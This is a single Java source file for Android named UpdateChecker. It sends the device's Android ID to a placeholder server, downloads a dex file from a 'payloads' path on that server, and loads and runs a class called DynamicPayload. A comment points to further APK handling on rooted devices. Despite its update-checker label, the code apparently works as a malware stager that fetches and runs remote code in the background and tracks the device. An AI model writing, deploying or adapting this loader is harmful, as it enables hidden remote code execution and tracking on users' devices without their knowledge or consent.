import android.content.Context;
import android.provider.Settings;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import dalvik.system.DexClassLoader;

public class UpdateChecker {

    public static void checkForUpdate(Context context) {
        new Thread(() -> {
            try {
                JSONObject json = new JSONObject();
                json.put("device_id", getDeviceId(context));
                json.put("version", "1.0"); // Current version of agent

                URL url = new URL("https://<your-server>/check_update");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(json.toString().getBytes("UTF-8"));
                }

                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = in.readLine()) != null) {
                    response.append(line);
                }

                JSONObject res = new JSONObject(response.toString());
                if (res.getBoolean("update_available")) {
                    String filename = res.getString("filename");
                    String type = res.getString("type");

                    if ("dex".equals(type)) {
                        downloadAndLoadDex(context, filename);
                    }
                    // add APK handling here if rooted
                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private static void downloadAndLoadDex(Context context, String filename) {
        try {
            URL url = new URL("https://<your-server>/payloads/" + filename);
            File dexFile = new File(context.getCacheDir(), filename);
            try (InputStream in = url.openStream();
                 OutputStream out = new FileOutputStream(dexFile)) {
                byte[] buf = new byte[4096];
                int len;
                while ((len = in.read(buf)) > 0) {
                    out.write(buf, 0, len);
                }
            }

            File optimizedDexOutputPath = context.getDir("outdex", Context.MODE_PRIVATE);
            DexClassLoader loader = new DexClassLoader(
                    dexFile.getAbsolutePath(),
                    optimizedDexOutputPath.getAbsolutePath(),
                    null,
                    context.getClassLoader()
            );

            Class<?> cls = loader.loadClass("com.mobilemorph.payload.DynamicPayload");
            Runnable r = (Runnable) cls.newInstance();
            r.run();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String getDeviceId(Context context) {
        return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
    }
}
